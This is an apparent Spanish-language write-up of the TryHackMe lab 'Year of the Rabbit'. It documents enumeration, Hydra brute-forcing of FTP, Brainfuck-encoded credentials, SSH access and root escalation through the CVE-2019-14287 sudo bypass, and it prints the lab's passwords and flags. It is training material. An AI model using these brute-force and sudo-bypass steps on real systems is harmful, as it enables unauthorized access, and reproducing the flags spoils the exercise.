---
title: "Year of the Rabbit - TryHackMe Writeup"
date: 2025-03-15 10:00:00 +0100
categories: [Linux, Easy]
tags: [tryhackme, linux, ftp, ssh, hydra, steganography, brainfuck, cve-2019-14287, privilege-escalation]
image: /imagenes/Year%20of%20the%20Rabbit.png
---

# Year of the Rabbit

---

## Fase 1 — Enumeración

### Fase 1.1 — Nmap Port Scan

**Comando ejecutado:**
```bash
nmap -sC -sV -oN year_rabbit.nmap <TARGET_IP>
```

**Puertos descubiertos:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.2 |
| 22/tcp | SSH | OpenSSH 6.7p1 Debian |
| 80/tcp | HTTP | Apache 2.4.10 Debian |

**Hallazgos:**
- Título HTTP: **Apache2 Debian Default Page**
- FTP vsftpd 3.0.2 → posible acceso anónimo
- SSH 6.7p1 → versión antigua

![fase1.1_nmap_scan.png](/linux/Year%20of%20the%20Rabbit/fase1.1_nmap_scan.png)

---

### Fase 1.2 — Enumeración Web

**Comando 1 — Gobuster puerto 80:**
```bash
# [MÁQUINA ATACANTE]
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
```

**Directorios descubiertos:**
- `/assets` → Status 301
- `/server-status` → Status 403

![fase1.2_gobuster_80.png](/linux/Year%20of%20the%20Rabbit/fase1.2_gobuster_80.png)

---

**Comando 2 — Visita /assets:**
```
http://<TARGET_IP>/assets
```

**Hallazgos:**
- `RickRolled.mp4` → distracción temática
- `style.css` → contiene pista oculta

![fase1.2_assets_web.png](/linux/Year%20of%20the%20Rabbit/fase1.2_assets_web.png)

---

**Comando 3 — Revisión de style.css:**
```
http://<TARGET_IP>/assets/style.css
```

**Hallazgos:**
- Comentario oculto en el CSS:
```
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

![fase1.2_style_css.png](/linux/Year%20of%20the%20Rabbit/fase1.2_style_css.png)

---

**Comando 4 — Visita /sup3r_s3cr3t_fl4g.php:**
```
http://<TARGET_IP>/sup3r_s3cr3t_fl4g.php
```

**Hallazgos:**
- Alert: "Word of advice... Turn off your javascript..."
- El JS redirige a YouTube → RickRoll distracción
- Con JS desactivado muestra un vídeo sin formato soportado

![fase1.2_secret_page.png](/linux/Year%20of%20the%20Rabbit/fase1.2_secret_page.png)

![fase1.2_secret_noscript.png](/linux/Year%20of%20the%20Rabbit/fase1.2_secret_noscript.png)

---

**Comando 5 — Interceptar redirección con curl:**
```bash
# [MÁQUINA ATACANTE]
curl -v http://<TARGET_IP>/sup3r_s3cr3t_fl4g.php 2>&1 | grep -i "location\|hidden"
```

**Hallazgos:**
- Directorio oculto: `/WExYY2Cv-qU`

![fase1.2_curl_redirect.png](/linux/Year%20of%20the%20Rabbit/fase1.2_curl_redirect.png)

---

**Comando 6 — Visita directorio oculto:**
```
http://<TARGET_IP>/WExYY2Cv-qU
```

**Hallazgos:**
- `Hot_Babe.png` → imagen con datos ocultos

![fase1.2_hidden_directory.png](/linux/Year%20of%20the%20Rabbit/fase1.2_hidden_directory.png)

---

**Comando 7 — Análisis de Hot_Babe.png con strings:**
```bash
# [MÁQUINA ATACANTE]
wget http://<TARGET_IP>/WExYY2Cv-qU/Hot_Babe.png
strings Hot_Babe.png | tail -20
strings Hot_Babe.png | grep -A 100 "ftpuser"
```

**Hallazgos:**
- Usuario FTP: `ftpuser`
- Lista de posibles contraseñas embebidas en la imagen

![fase1.2_strings_hotbabe.png](/linux/Year%20of%20the%20Rabbit/fase1.2_strings_hotbabe.png)

![fase1.2_strings_ftpuser.png](/linux/Year%20of%20the%20Rabbit/fase1.2_strings_ftpuser.png)

---

### Fase 1.3 — Enumeración FTP

**Comando 1 — Crear wordlist y fuerza bruta con Hydra:**
```bash
# [MÁQUINA ATACANTE]
strings Hot_Babe.png | grep -A 100 "ftpuser" | tail -n +3 > wordlist.txt
hydra -l ftpuser -P wordlist.txt ftp://<TARGET_IP> -t 6
```

**Credenciales FTP obtenidas:**

| Campo | Valor |
|-------|-------|
| Usuario | `ftpuser` |
| Password | `5iez1wGXKfPKQ` |

![fase1.3_hydra_ftp.png](/linux/Year%20of%20the%20Rabbit/fase1.3_hydra_ftp.png)

---

**Comando 2 — Login FTP y descarga de archivos:**
```bash
# [MÁQUINA ATACANTE]
ftp <TARGET_IP>
# Usuario: ftpuser
# Password: 5iez1wGXKfPKQ
ls -la
get Eli's_Creds.txt
exit
```

**Hallazgos:**
- `Eli's_Creds.txt` → archivo de credenciales codificado

![fase1.3_ftp_login.png](/linux/Year%20of%20the%20Rabbit/fase1.3_ftp_login.png)

---

**Comando 3 — Leer Eli's_Creds.txt:**
```bash
# [MÁQUINA ATACANTE]
cat Eli\'s_Creds.txt
```

**Hallazgos:**
- Contenido en **Brainfuck** → lenguaje esotérico de programación

![fase1.3_elis_creds.png](/linux/Year%20of%20the%20Rabbit/fase1.3_elis_creds.png)

---

**Comando 4 — Decodificar Brainfuck:**

Decodificado en: `https://www.splitbrain.org/_static/ook/`

**Credenciales SSH obtenidas:**

| Campo | Valor |
|-------|-------|
| Usuario | `eli` |
| Password | `DSpDiM1wAEwid` |

![fase1.3_brainfuck_decode.png](/linux/Year%20of%20the%20Rabbit/fase1.3_brainfuck_decode.png)

---

## Fase 2 — Foothold

### Fase 2.1 — Acceso SSH como eli

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
ssh eli@<TARGET_IP>
# Password: DSpDiM1wAEwid
```

**Hallazgos:**
- Acceso exitoso como `eli`
- Banner con mensaje de Root a Gwendoline: "Check our leet s3cr3t hiding place"

![fase2.1_ssh_eli.png](/linux/Year%20of%20the%20Rabbit/fase2.1_ssh_eli.png)

---

### Fase 2.2 — Búsqueda del directorio secreto

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO]
find / -name s3cr3t 2>/dev/null
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
```

**Hallazgos:**
- Directorio: `/usr/games/s3cr3t`
- **Password de Gwendoline:** `MniVCQVhQHUNI`

![fase2.2_find_s3cr3t.png](/linux/Year%20of%20the%20Rabbit/fase2.2_find_s3cr3t.png)

---

### Fase 2.3 — User Flag

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO]
su gwendoline
# Password: MniVCQVhQHUNI
cat /home/gwendoline/user.txt
```

**User Flag:**
```
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

![fase2.3_user_flag.png](/linux/Year%20of%20the%20Rabbit/fase2.3_user_flag.png)

---

## Fase 3 — Escalada de Privilegios

### Fase 3.1 — Identificación del vector PrivEsc

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO]
sudo -l
```

**Hallazgos:**
- `(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt`
- **CVE-2019-14287** → bypass de `!root` usando `-u#-1`

![fase3.1_sudo_l.png](/linux/Year%20of%20the%20Rabbit/fase3.1_sudo_l.png)

---

### Fase 3.2 — Escalada a Root (CVE-2019-14287)

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO]
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
# Dentro de vi:
:!/bin/bash
whoami
```

![fase3.2_root_shell.png](/linux/Year%20of%20the%20Rabbit/fase3.2_root_shell.png)

---

### Fase 3.3 — Root Flag

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO]
cat /root/root.txt
```

**Root Flag:**
```
THM{8d6f163a87a1c80de27a4fd61aef03a0ecf9161}
```

![fase3.3_root_flag.png](/linux/Year%20of%20the%20Rabbit/fase3.3_root_flag.png)
